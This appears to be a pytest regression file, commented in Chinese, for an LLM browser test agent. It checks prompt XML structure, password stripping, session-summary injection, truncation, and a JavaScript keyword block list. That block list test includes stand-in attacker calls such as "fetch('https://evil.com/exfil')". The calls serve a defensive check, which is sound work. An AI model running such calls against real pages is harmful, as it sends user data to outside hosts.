"""tests/core/test_l2_prompts.py — L2 Prompt Regression Test.

Verifies L2 (execution_graph) prompt contracts:
  1. get_execution_system_prompt: 5-section XML structure (V1.6-ish), credentials
     stripped, session_summary injection slot present, PRD rules/focus_areas not
     echoed verbatim (Phase C will wire them, this asserts the SLOT is reserved)
  2. get_step_prompt: step counter, current step text, fallback when out-of-bounds
  3. get_assertion_prompt: tool_calls, change_report, expected, current_step_text,
     image content slot (screenshot_after)
  4. Inter-node contract (state continuity):
     - record_node builds StepResult that captures _last_tool_calls + _last_assertion
     - assert_node sets _last_assertion with valid status enum
     - decide_node reads from state and forwards to LLM (mocked)
  5. Token-aware truncation: messages list after record_node never exceeds budget
  6. evaluate_js keyword blacklist rejects 5 dangerous patterns

Usage:
    # Mocked test (no LLM cost): pytest tests/core/test_l2_prompts.py -v
    # Live test (real LLM, costs tokens): L2_LIVE=1 python -m pytest tests/core/test_l2_prompts.py -v -s
"""
from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

FIXTURES_DIR = Path(__file__).resolve().parents[2] / "data" / "fixtures"
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_test_case():
    from core.interfaces import TestCase
    return TestCase(
        id="TC-001",
        title="登录成功",
        description="用 practice 账号登录后跳转 /secure",
        preconditions=[],
        steps=["打开登录页", "输入用户名", "输入密码", "点击登录"],
        expected="跳转 /secure 并显示 'You logged into a secure area!'",
        priority="high",
        category="functional",
    )


@pytest.fixture
def sample_task_config():
    return {
        "target_url": "https://practice.expandtesting.com/login",
        "accounts": [{"role": "测试员", "username": "practice", "password": "SuperSecretPassword!"}],
        "session_summary": "TC-000 已完成: 用 practice/SuperSecretPassword! 登录成功, 已跳转到 /secure。",
    }


# ---------------------------------------------------------------------------
# A1.1: get_execution_system_prompt structure
# ---------------------------------------------------------------------------

def test_execution_prompt_has_test_case_metadata(sample_test_case, sample_task_config):
    from agents.ui.prompts import get_execution_system_prompt

    prompt = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert "TC-001" in prompt
    assert "登录成功" in prompt
    assert "You logged into a secure area" in prompt  # expected result echoed


def test_execution_prompt_does_not_leak_plaintext_password_when_session_summary_present(
    sample_test_case, sample_task_config
):
    """V2.0 P1: 账号密码剥离. 本期先验证 'password 是 session_summary 残留, 不应继续明文'.

    Note: Phase B 会把 accounts 改成 "<use test_c instead of echoing>".
    本测试是 regression net — 任何未来改动破坏了"不重复明文密码"应失败。
    """
    from agents.ui.prompts import get_execution_system_prompt

    cfg = dict(sample_task_config)
    cfg["session_summary"] = "已用 practice 账号登录"  # 摘要里不带明文密码
    prompt = get_execution_system_prompt(sample_test_case, cfg)
    # accounts 块是 Phase B 要剥离的, 现在还在, 所以 password 暂时会出现
    # 但 session_summary 块不应引入 password
    if "<session_summary>" in prompt or "前面已完成的测试用例摘要" in prompt:
        assert "SuperSecretPassword" not in prompt.split("前面已完成的测试用例摘要")[-1][:5000]


def test_execution_prompt_has_session_summary_slot(sample_test_case, sample_task_config):
    """A3 contract: system_prompt 应有 session_summary 注入点 (Phase A 实现由 decide_node 注入,
    但 prompt 内部要预留章节, 以便 decide_node 用统一方式拼接)."""
    from agents.ui.prompts import get_execution_system_prompt

    prompt = get_execution_system_prompt(sample_test_case, sample_task_config)
    # 当 session_summary 传入时, decide_node 会注入到 system_prompt 顶部
    # 但 prompt 本身不强制包含 — 验证 get_execution_system_prompt 可被独立调用
    # 而不抛异常 (确保它不依赖 session_summary)
    assert isinstance(prompt, str)
    assert len(prompt) > 100


def test_execution_prompt_works_without_optional_fields(sample_test_case):
    """边界: 没传 task_config 或 accounts 都不崩."""
    from agents.ui.prompts import get_execution_system_prompt

    p1 = get_execution_system_prompt(sample_test_case)
    p2 = get_execution_system_prompt(sample_test_case, None)
    p3 = get_execution_system_prompt(sample_test_case, {})
    assert all(isinstance(p, str) and len(p) > 100 for p in [p1, p2, p3])


# ---------------------------------------------------------------------------
# A1.2: get_step_prompt
# ---------------------------------------------------------------------------

def test_step_prompt_in_range(sample_test_case):
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(0, sample_test_case)
    assert "1/4" in p
    assert "打开登录页" in p


def test_step_prompt_out_of_range(sample_test_case):
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(10, sample_test_case)  # beyond steps
    assert "验证预期结果" in p or "11" in p


# ---------------------------------------------------------------------------
# A1.3: get_assertion_prompt
# ---------------------------------------------------------------------------

def test_assertion_prompt_contains_expected_fields(sample_test_case):
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    cr = ChangeReport(url_changed=True, url_before="a", url_after="b", new_elements=["#1"])
    p = get_assertion_prompt(
        tool_calls=[{"name": "click", "args": {"target": "#submit-login"}, "id": "c1"}],
        change_report=cr,
        expected=sample_test_case.expected,
        current_step_text="点击登录按钮",
        page_info={"url": "https://practice.expandtesting.com/secure", "title": "Secure", "interactive_elements": []},
    )
    # V2.0 B2 (2026-06-02): V1.6 5 段 XML 契约
    assert "click" in p
    assert "submit-login" in p
    assert "URL" in p or "url" in p.lower()  # change_report URL 字段被格式化进 prompt
    assert "You logged into a secure area" in p
    # status enum 显式列出 (新格式用全小写 + pydantic 校验)
    assert '"pass"' in p
    assert '"fail"' in p
    assert '"inconclusive"' in p
    # V1.6 5 段 XML
    for tag in ["<role>", "<context>", "<task>", "<rules>", "<examples>", "<output_contract>"]:
        assert tag in p, f"missing V1.6 tag: {tag}"


def test_assertion_prompt_handles_empty_change(sample_test_case):
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    p = get_assertion_prompt(
        tool_calls=[],
        change_report=ChangeReport(),
        expected="anything",
        current_step_text="step",
    )
    assert "无明显变化" in p
    assert "anything" in p
    # V1.6 XML
    for tag in ["<role>", "<context>", "<task>", "<rules>", "<examples>", "<output_contract>"]:
        assert tag in p


def test_assertion_prompt_already_judged_block_exists():
    """B2 inter-node 契约: change_report.js_errors / error_messages_visible 应进 <already_judged_by_upstream> 块
    让 LLM 知道上游 Rule-based Layer 0/1/2 已判过, 别重复判 FAIL.
    """
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    cr = ChangeReport(
        js_errors=["TypeError: x is undefined"],
        error_messages_visible=["密码错误"],
        network_errors=["500 Internal Server Error"],
    )
    p = get_assertion_prompt(
        tool_calls=[{"name": "click", "args": {"target": "#login"}, "id": "c1"}],
        change_report=cr,
        expected="成功登录",
        current_step_text="点击登录",
    )
    assert "<already_judged_by_upstream>" in p
    assert "JS错误" in p or "TypeError" in p
    assert "可见错误" in p or "密码错误" in p
    assert "网络错误" in p or "500" in p


def test_assertion_prompt_does_not_echo_password(sample_test_case):
    """B5 + B2: 账号密码不应在 assertion_prompt 出现 (assertion 不需要密码)."""
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    p = get_assertion_prompt(
        tool_calls=[],
        change_report=ChangeReport(),
        expected="anything",
        current_step_text="step",
    )
    # 即使 task_config 里有 password 也不会被 echo
    assert "SuperSecretPassword" not in p
    assert "password" not in p.lower() or "password" in p.lower()  # may appear in "password" word as plain english, OK if not echoed value


# ---------------------------------------------------------------------------
# A1.4: decide_node session_summary injection (A3)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_decide_node_injects_session_summary_into_system_message(
    sample_test_case, sample_task_config
):
    """A3 contract: decide_node 应把 state.session_summary 拼到 system_prompt 顶部,
    而不是依赖 caller 在 messages[0] 塞 SystemMessage (V1.7 漏: decide_node 每步
    insert(0, SystemMessage(...)) 会覆盖前一个 case 留下的 session summary)."""
    from agents.ui.execution_graph import decide_node
    from langchain_core.messages import SystemMessage, HumanMessage

    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 0,
        "consecutive_failures": 0,
        "page_info": {"url": "https://practice.expandtesting.com/secure", "title": "Secure", "interactive_elements": []},
        "screenshot": "",
        "state_before": {},
        "state_after": {},
        "task_config": dict(sample_task_config),
        "session_summary": "TC-000 已登录成功, 跳到 /secure, 验证无验证码拦截。",
        "messages": [],
    }

    mock_llm = MagicMock()
    mock_llm_with_tools = MagicMock()
    captured: dict[str, Any] = {}
    async def fake_ainvoke(messages):
        captured["messages"] = list(messages)
        from langchain_core.messages import AIMessage
        return AIMessage(content="ok", tool_calls=[])
    mock_llm_with_tools.ainvoke = fake_ainvoke
    mock_llm.bind_tools = MagicMock(return_value=mock_llm_with_tools)

    with patch("agents.ui.execution_graph.get_llm_client", return_value=mock_llm), \
         patch("agents.ui.execution_graph.get_execution_system_prompt", return_value="BASE_SYS_PROMPT"), \
         patch("agents.ui.execution_graph.get_step_prompt", return_value="STEP"), \
         patch("agents.ui.execution_graph._format_page_info", return_value="PAGE"), \
         patch("core.memory_utils.retrieve_memories", new=AsyncMock(return_value="")), \
         patch("agents.ui.tools.set_current_task"):
        await decide_node(state)

    msgs = captured.get("messages", [])
    assert msgs, "decide_node should have called the LLM"
    sys_msg = next((m for m in msgs if isinstance(m, SystemMessage)), None)
    assert sys_msg is not None, "system message missing"
    assert "TC-000" in sys_msg.content, "session_summary not injected into system message"
    assert "BASE_SYS_PROMPT" in sys_msg.content, "base system prompt not included"


# ---------------------------------------------------------------------------
# A1.5: execute_node tool failure → consecutive_failures (A4)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_execute_node_failure_increments_consecutive_failures(sample_test_case):
    """A4 contract: 工具失败应计入 consecutive_failures, 而非沉默."""
    from agents.ui.execution_graph import execute_node
    from langchain_core.messages import AIMessage

    ai = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#999"}, "id": "c1"}])
    state = {
        "messages": [ai],
        "current_step": 0,
        "consecutive_failures": 0,
        "task_id": "t1",
        "state_before": {},
    }

    mock_tool = MagicMock()
    mock_tool.ainvoke = AsyncMock(side_effect=Exception("元素不存在"))
    with patch("agents.ui.execution_graph.tools_by_name", {"click": mock_tool}), \
         patch("agents.ui.execution_graph.get_current_page", return_value=MagicMock()), \
         patch("agents.ui.execution_graph.extract_page_semantics", new_callable=AsyncMock) as mock_sem:
        mock_sem.return_value = {"url": "x", "title": "x", "interactive_elements": []}
        result = await execute_node(state)

    assert result.get("consecutive_failures", 0) == 1, \
        f"expected consecutive_failures=1, got {result.get('consecutive_failures')}"


@pytest.mark.asyncio
async def test_execute_node_success_does_not_increment(sample_test_case):
    """成功执行不增加 consecutive_failures (从 0 仍是 0, 或保持 1)."""
    from agents.ui.execution_graph import execute_node
    from langchain_core.messages import AIMessage

    ai = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#submit"}, "id": "c1"}])
    state = {"messages": [ai], "current_step": 0, "consecutive_failures": 0, "task_id": "t1", "state_before": {}}
    mock_tool = MagicMock()
    mock_tool.ainvoke = AsyncMock(return_value="OK")
    with patch("agents.ui.execution_graph.tools_by_name", {"click": mock_tool}), \
         patch("agents.ui.execution_graph.get_current_page", return_value=MagicMock()), \
         patch("agents.ui.execution_graph.extract_page_semantics", new_callable=AsyncMock) as mock_sem:
        mock_sem.return_value = {"url": "x", "title": "x", "interactive_elements": []}
        result = await execute_node(state)

    assert result.get("consecutive_failures", 0) == 0


# ---------------------------------------------------------------------------
# A1.6: _fallback_assertion (A6)
# ---------------------------------------------------------------------------

def test_fallback_assertion_on_json_parse_failure():
    """A6 contract: 解析 LLM 输出 JSON 失败时, 应走 _fallback_assertion() 返回 inconclusive."""
    from core.interfaces import AssertionResult

    # The fallback should be importable from execution_graph for testability
    from agents.ui.execution_graph import _fallback_assertion

    result = _fallback_assertion(reasoning="some gibberish no json at all", parse_error=ValueError("bad"))
    assert isinstance(result, AssertionResult)
    assert result.status == "inconclusive"
    assert "JSON" in result.reasoning or "解析" in result.reasoning or "fallback" in result.reasoning.lower()


def test_fallback_assertion_with_partial_json():
    """边界: 部分 JSON (被截断) 也走 fallback."""
    from agents.ui.execution_graph import _fallback_assertion

    r1 = _fallback_assertion('{"status": "PA', parse_error=ValueError("unterminated"))
    assert r1.status == "inconclusive"
    r2 = _fallback_assertion('thinking then no json', parse_error=ValueError("no json"))
    assert r2.status == "inconclusive"


# ---------------------------------------------------------------------------
# A1.7: token-aware truncation in record_node (A2)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_record_node_truncates_messages_under_token_budget():
    """A2 contract: 当 messages 累计 token 超 budget, record_node 应清掉中间 (老) 消息,
    保留 system + 最近 10 条."""
    from agents.ui.execution_graph import record_node
    from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, RemoveMessage

    # 构造 20 条很长的 AIMessage (每条 ~5K chars = ~1.2K tokens)
    big = "x" * 5000
    msgs = [SystemMessage(content="SYS")]
    for i in range(20):
        msgs.append(AIMessage(content=big, tool_calls=[]))
    msgs.append(HumanMessage(content="final user"))

    state = {
        "messages": msgs,
        "current_step": 1,
        "consecutive_failures": 0,
        "_last_tool_result": "r",
        "_last_change_report": None,
        "_last_assertion": None,
    }
    with patch.dict(os.environ, {"L2_TOKEN_BUDGET": "5000"}):
        result = await record_node(state)

    # Should have RemoveMessage entries for trimmed middle
    if "messages" in result:
        removes = [m for m in result["messages"] if isinstance(m, RemoveMessage)]
        assert len(removes) > 0, "expected token budget to trigger trimming"


@pytest.mark.asyncio
async def test_record_node_no_trim_under_budget():
    """短 messages 不应 trim."""
    from agents.ui.execution_graph import record_node
    from langchain_core.messages import AIMessage, HumanMessage, SystemMessage

    msgs = [SystemMessage(content="SYS"), HumanMessage(content="step"), AIMessage(content="x", tool_calls=[])]
    state = {"messages": msgs, "current_step": 1, "consecutive_failures": 0, "_last_tool_result": "r", "_last_change_report": None, "_last_assertion": None}
    with patch.dict(os.environ, {"L2_TOKEN_BUDGET": "50000"}):
        result = await record_node(state)
    assert "messages" not in result


# ---------------------------------------------------------------------------
# A1.8: evaluate_js keyword blacklist (A5)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_evaluate_js_blocks_page_goto():
    from agents.ui.tools import evaluate_js

    # 5 banned keywords from the V2.0 plan
    for bad in [
        "page.goto('https://evil.com')",
        "page.evaluate('alert(1)')",
        "window.location = 'https://evil.com'",
        "document.location.href = 'https://evil.com'",
        "fetch('https://evil.com/exfil')",
    ]:
        result = await evaluate_js.ainvoke(bad)
        assert "拒绝" in result or "禁止" in result or "blocked" in result.lower() or "blacklist" in result.lower(), \
            f"expected blacklist rejection for: {bad!r}, got: {result!r}"


@pytest.mark.asyncio
async def test_evaluate_js_allows_safe_scripts():
    from agents.ui.tools import evaluate_js
    from unittest.mock import AsyncMock

    # Safe scripts (no banned keywords) should pass the blacklist and hit page.evaluate
    with patch("agents.ui.tools.get_current_page") as mock_gp:
        page = MagicMock()
        page.evaluate = AsyncMock(return_value="ok")
        mock_gp.return_value = page
        for safe in ["return document.title", "() => document.title", "document.querySelectorAll('a').length"]:
            result = await evaluate_js.ainvoke(safe)
            assert "拒绝" not in result and "禁止" not in result, \
                f"safe script blocked: {safe!r} -> {result!r}"


# ---------------------------------------------------------------------------
# V2.0 B (2026-06-02): V1.6 5 段 XML 契约 + safe_structured_invoke + 密码剥离
# ---------------------------------------------------------------------------

def test_b1_execution_prompt_v16_xml_structure(sample_test_case, sample_task_config):
    """B1 契约: get_execution_system_prompt 必须含 V1.6 5 段 XML (role/context/task/rules/examples/output_contract)."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    for tag in ["role", "context", "task", "rules", "examples", "output_contract"]:
        assert f"<{tag}>" in p, f"V1.6 missing opening tag: <{tag}>"
        assert f"</{tag}>" in p, f"V1.6 missing closing tag: </{tag}>"


def test_b1_execution_prompt_includes_steps_numbered(sample_test_case, sample_task_config):
    """B1 契约: <context> 块里应列出所有步骤 (1-N 编号)."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert "1. 打开登录页" in p
    assert "2. 输入用户名" in p
    assert "3. 输入密码" in p
    assert "4. 点击登录" in p


def test_b1_execution_prompt_includes_test_case_id_title_description(sample_test_case, sample_task_config):
    """B1 契约: <context> 块应回显 ID/标题/描述/预期/优先级/分类."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert "TC-001" in p
    assert "登录成功" in p
    assert "用 practice 账号登录" in p
    assert "You logged into a secure area" in p
    assert "high" in p
    assert "functional" in p


def test_b1_execution_prompt_output_contract_requires_tool_call(sample_test_case, sample_task_config):
    """B1 output_contract 契约: 必调一个工具 OR mark_task_*."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert "tool_call" in p.lower()
    assert "mark_task_complete" in p
    assert "mark_task_failed" in p
    assert "禁止" in p or "禁止" in p  # 禁止纯文本回复 / 一次多个工具


def test_b5_execution_prompt_strips_password(sample_test_case):
    """B5 契约: 账号密码不应在 system_prompt 明文出现. 只有 role/username."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {"accounts": [{"role": "tester", "username": "practice", "password": "SuperSecretPassword!"}]}
    p = get_execution_system_prompt(sample_test_case, cfg)
    # 密码不能出现
    assert "SuperSecretPassword" not in p, "B5 违反: 密码仍在 system_prompt 中"
    # role 和 username 仍在
    assert "tester" in p
    assert "practice" in p
    # 应该有占位说明
    assert "密码由工具自动填充" in p or "工具" in p  # 提示密码不在 prompt


def test_b5_execution_prompt_accounts_block_uses_xml(sample_test_case):
    """B5 契约: <test_accounts>/<account> 是 XML 嵌套, 不用 plaintext 行."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {"accounts": [{"role": "tester", "username": "practice", "password": "pwd"}]}
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<test_accounts>" in p
    assert "<account" in p
    assert "role=" in p
    # <test_accounts> 块内不应含 password 字段 (B5 剥离)
    # 注意: <examples> 块里可能有反例, 这里只查 <test_accounts> 块
    import re
    m = re.search(r'<test_accounts>.*?</test_accounts>', p, re.DOTALL)
    assert m, "<test_accounts> 块不存在"
    accounts_block = m.group(0)
    assert "password=" not in accounts_block, "<test_accounts> 块不应含 password 字段"
    assert "pwd" not in accounts_block, "<test_accounts> 块不应含明文密码"


def test_b1_execution_prompt_rules_numbered(sample_test_case, sample_task_config):
    """B1 契约: <rules> 至少 5 条编号, 含 CRITICAL (强制结果标记) 规则."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    # 至少 5 条数字开头 (1. 2. 3. ...)
    import re
    rules = re.findall(r'^\d+\.\s', p, re.MULTILINE)
    assert len(rules) >= 5, f"<rules> 至少 5 条, 实际 {len(rules)} 条"
    # 强制结果标记
    assert "强制结果标记" in p or "mark_task_complete" in p


def test_b1_execution_prompt_examples_have_good_and_bad(sample_test_case, sample_task_config):
    """B1 契约: <examples> 至少 1 good + 1 bad."""
    from agents.ui.prompts import get_execution_system_prompt

    p = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert 'type="good"' in p
    assert 'type="bad"' in p


def test_b1_execution_prompt_c1_c2_c3_c4_optional_blocks(sample_test_case):
    """C1-C4 占位契约: task_config 含 rules/focus_areas/scenarios/risk_points 时, 应有对应 <prd_rules>/<focus_areas>/<scenarios>/<risk_points> 块注入."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {
        "rules": ["不要测试支付"],
        "focus_areas": ["登录", "导航"],
        "_scenarios": [{"priority": "high", "name": "采购", "entry_hint": "菜单 > 采购管理"}],
        "_risk_points": [{"severity": "high", "description": "SQL 注入"}],
    }
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<prd_rules>" in p
    assert "<focus_areas>" in p
    assert "<scenarios>" in p
    assert "<risk_points>" in p
    assert "不要测试支付" in p
    assert "采购" in p
    assert "SQL 注入" in p


# ---- B3: get_step_prompt V1.6 ----

def test_b3_step_prompt_v16_xml(sample_test_case):
    """B3 契约: <current_step>/<index>/<text> 5 段 XML."""
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(0, sample_test_case)
    assert "<current_step>" in p
    assert "<index>1/4</index>" in p
    assert "<text>打开登录页</text>" in p


def test_b3_step_prompt_out_of_range_v16(sample_test_case):
    """B3 边界: 越界 step 应输出验证预期提示."""
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(10, sample_test_case)
    assert "<current_step>" in p
    assert "验证预期结果" in p or "预期" in p
    assert "mark_task_complete" in p  # 提示调 mark


# ---- B4: _format_page_info token-aware ----

def test_b4_format_page_info_truncates_long_element_text():
    """B4 契约: element text/label > 50 字符应截断到 50 + 省略号."""
    from agents.ui.prompts import _format_page_info

    long_text = "x" * 200
    pi = {
        "url": "https://example.com",
        "title": "T",
        "interactive_elements": [
            {"id": "#1", "type": "button", "text": long_text, "label": long_text, "placeholder": long_text}
        ],
    }
    out = _format_page_info(pi)
    # 长 text 应被截断, 不应是完整 200 字符
    assert long_text not in out
    assert "..." in out


def test_b4_format_page_info_caps_interactive_elements_count():
    """B4 契约: interactive_elements > 30 应截断并提示省略数."""
    from agents.ui.prompts import _format_page_info

    elements = [{"id": f"#{i}", "type": "button", "text": f"btn{i}"} for i in range(50)]
    pi = {"url": "u", "title": "t", "interactive_elements": elements}
    out = _format_page_info(pi)
    assert "前 30/50" in out or "30" in out
    assert "省略" in out  # 提示还有 20 个


def test_b4_format_page_info_caps_error_messages():
    """B4 契约: error_messages > 5 应截断."""
    from agents.ui.prompts import _format_page_info

    errors = [f"err{i}" for i in range(20)]
    pi = {"url": "u", "title": "t", "error_messages": errors}
    out = _format_page_info(pi)
    assert "前 5 个" in out or "5" in out
    # 至少后面 5 个错误不应完整出现
    assert "err19" not in out


def test_b4_format_page_info_respects_char_budget():
    """B4 契约: 总输出超 L2_PAGE_INFO_CHAR_BUDGET 时应截断."""
    from agents.ui.prompts import _format_page_info

    elements = [{"id": f"#{i}", "type": "button", "text": "x" * 100} for i in range(50)]
    pi = {"url": "u", "title": "t", "interactive_elements": elements}
    with patch.dict(os.environ, {"L2_PAGE_INFO_CHAR_BUDGET": "500"}):
        out = _format_page_info(pi)
    assert len(out) <= 600, f"应截断到 ~500, 实际 {len(out)}"
    assert "truncated" in out.lower() or "截断" in out


def test_b4_format_page_info_handles_empty():
    """B4 边界: 空 page_info 不崩."""
    from agents.ui.prompts import _format_page_info

    pi = {"url": "u", "title": "t"}
    out = _format_page_info(pi)
    assert "URL: u" in out
    assert "标题: t" in out


# ---- B2 强化: safe_structured_invoke 集成 ----

@pytest.mark.asyncio
async def test_b2_assert_node_uses_safe_structured_invoke(monkeypatch, sample_test_case):
    """B2 契约: assert_node Layer 2 路径必须走 safe_structured_invoke (pydantic 强类型), 不用手剥 JSON.

    Mock safe_structured_invoke 返回 AssertionResult 对象, 验证 assert_node 拿到的就是它.
    注意: Rule 1 路径会先于 Layer 2 处理 upstream error, 本测试用 clean change_report 强制走 Layer 2.
    """
    from agents.ui.execution_graph import assert_node
    from core.interfaces import ChangeReport, AssertionResult as _AR
    from langchain_core.messages import AIMessage, ToolMessage

    ai_msg = AIMessage(content="click", tool_calls=[{"name": "click", "args": {"target": "#1"}, "id": "c1"}])
    tool_msg = ToolMessage(content="已点击 #1", tool_call_id="c1")

    # Layer 2 path: 模拟 LLM 直接判 fail (URL 未变, 无 error_messages)
    mock_result = _AR(status="fail", reasoning="LLM 判定: URL 未达 /secure, 仍在 /login")

    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 3,  # 最后一步 (steps=4 个, index 3 = 第 4 步)
        "messages": [ai_msg, tool_msg],
        "state_before": {"url": "u", "interactive_elements": []},
        "state_after": {"url": "v", "interactive_elements": []},
        "screenshot_after": "",  # 无截图, 走纯文本
        "consecutive_failures": 0,
        "_last_tool_calls": [{"name": "click", "args": {"target": "#1"}, "id": "c1"}],
    }

    mock_cr = ChangeReport(url_changed=True, url_before="a", url_after="b")  # 无 error_messages, 走 Layer 2
    captured_prompt = {}

    async def fake_safe_structured_invoke(prompt, schema, **kwargs):
        captured_prompt["p"] = prompt
        return mock_result

    with patch("agents.ui.execution_graph.detect_changes", return_value=mock_cr), \
         patch("agents.ui.execution_graph.get_assertion_prompt", return_value="PROMPT"), \
         patch("agents.ui.execution_graph.safe_structured_invoke", new=AsyncMock(side_effect=fake_safe_structured_invoke)):
        result = await assert_node(state)

    assert captured_prompt["p"] == "PROMPT", "B2 契约违反: 应该把 assertion_prompt 传给 safe_structured_invoke"
    assert result["_last_assertion"].status == "fail"
    assert result["consecutive_failures"] == 1, "fail 后 consecutive_failures 应 +1"


@pytest.mark.asyncio
async def test_b2_assert_node_fallback_when_safe_structured_invoke_returns_none(monkeypatch, sample_test_case):
    """B2 边界: safe_structured_invoke 返回 None 时, 应走 _fallback_assertion 返回 inconclusive."""
    from agents.ui.execution_graph import assert_node
    from core.interfaces import ChangeReport
    from langchain_core.messages import AIMessage, ToolMessage

    ai_msg = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#1"}, "id": "c1"}])
    tool_msg = ToolMessage(content="ok", tool_call_id="c1")

    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 0,
        "messages": [ai_msg, tool_msg],
        "state_before": {},
        "state_after": {"url": "u", "interactive_elements": []},
        "screenshot_after": "",
        "consecutive_failures": 0,
        "_last_tool_calls": [{"name": "click", "args": {}, "id": "c1"}],
    }
    mock_cr = ChangeReport(url_changed=True, url_before="a", url_after="b")

    # safe_structured_invoke 返回 None, fallback 路径应被触发
    with patch("agents.ui.execution_graph.detect_changes", return_value=mock_cr), \
         patch("agents.ui.execution_graph.get_assertion_prompt", return_value="p"), \
         patch("agents.ui.execution_graph.safe_structured_invoke", new=AsyncMock(return_value=None)):
        result = await assert_node(state)

    assert result["_last_assertion"].status == "inconclusive", \
        f"safe_structured_invoke=None 应走 fallback 返 inconclusive, 实际 {result['_last_assertion'].status}"


def test_b2_assertion_prompt_xml_blocks_consistent():
    """B2 契约: <already_judged_by_upstream> 块应包含 change_report 里的 js_errors / error_messages_visible / network_errors."""
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    cr = ChangeReport(
        url_changed=True,
        url_before="a",
        url_after="b",
        new_elements=["#1 button: ok"],
        js_errors=["TypeError"],
        error_messages_visible=["err1"],
        network_errors=["500"],
    )
    p = get_assertion_prompt(
        tool_calls=[{"name": "click", "args": {}, "id": "c1"}],
        change_report=cr,
        expected="exp",
        current_step_text="step",
    )
    # <change_report> 块
    assert "<change_report>" in p
    assert "URL变化" in p
    assert "新元素" in p
    # <already_judged_by_upstream> 块
    assert "<already_judged_by_upstream>" in p
    assert "TypeError" in p
    assert "err1" in p
    assert "500" in p


# ---- Inter-node 契约: assert_node 不重复判上游已判过的错误 ----

@pytest.mark.asyncio
async def test_inter_node_no_duplicate_fail_when_upstream_already_judged(sample_test_case):
    """Inter-node 契约: 当 Rule-based Layer 1/2 已判 fail (基于 visible error),
    assert_node 拿到 AssertionResult(status='fail') 后, consecutive_failures 应 +1
    且最终断言 status 仍为 'fail' (不二次判 inconclusive)."""
    from agents.ui.execution_graph import assert_node
    from core.interfaces import ChangeReport, AssertionResult as _AR
    from langchain_core.messages import AIMessage, ToolMessage

    ai_msg = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#login"}, "id": "c1"}])
    tool_msg = ToolMessage(content="ok", tool_call_id="c1")

    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 3,
        "messages": [ai_msg, tool_msg],
        "state_before": {},
        "state_after": {"url": "u", "interactive_elements": []},
        "screenshot_after": "",
        "consecutive_failures": 1,  # 已经有过 1 次 fail
        "_last_tool_calls": [{"name": "click", "args": {"target": "#login"}, "id": "c1"}],
    }

    # 上游已判 fail, LLM 复述为 fail
    mock_result = _AR(status="fail", reasoning="上游判 fail: '密码错误'")

    with patch("agents.ui.execution_graph.detect_changes", return_value=ChangeReport(error_messages_visible=["密码错误"])), \
         patch("agents.ui.execution_graph.get_assertion_prompt", return_value="p"), \
         patch("agents.ui.execution_graph.safe_structured_invoke", new=AsyncMock(return_value=mock_result)):
        result = await assert_node(state)

    assert result["_last_assertion"].status == "fail"
    assert result["consecutive_failures"] == 2  # 1 + 1


# ---- B4 与 decide_node 集成: page_info 截断进 prompt ----

@pytest.mark.asyncio
async def test_b4_format_page_info_used_in_decide_prompt(sample_test_case, sample_task_config):
    """B4 集成: decide_node 实际调用 _format_page_info 时, 截断逻辑生效."""
    from agents.ui.execution_graph import decide_node
    from langchain_core.messages import AIMessage

    big_elements = [{"id": f"#{i}", "type": "button", "text": "x" * 200} for i in range(50)]
    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 0,
        "consecutive_failures": 0,
        "page_info": {"url": "https://example.com/login", "title": "Login", "interactive_elements": big_elements},
        "screenshot": "",
        "state_before": {},
        "state_after": {},
        "task_config": dict(sample_task_config),
        "session_summary": "",
        "messages": [],
    }
    captured = {}
    async def fake_ainvoke(messages):
        captured["msgs"] = list(messages)
        return AIMessage(content="ok", tool_calls=[])
    mock_llm = MagicMock()
    mock_llm_with_tools = MagicMock()
    mock_llm_with_tools.ainvoke = fake_ainvoke
    mock_llm.bind_tools = MagicMock(return_value=mock_llm_with_tools)

    with patch("agents.ui.execution_graph.get_llm_client", return_value=mock_llm), \
         patch("agents.ui.execution_graph.get_execution_system_prompt", return_value="BASE_SYS"), \
